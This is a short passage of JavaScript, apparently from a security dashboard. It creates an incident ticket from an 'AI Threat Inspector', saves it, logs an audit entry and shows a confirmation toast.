    meta.incidents = [newInc, ...(meta.incidents || [])];
    saveMeta();
    appendAudit(`Created new security incident ${newIncId} from AI Threat Inspector`, newIncId, 'incident');
    showToast(`Incident ticket ${newIncId} created in Incident Center!`, 'success');
  });
}
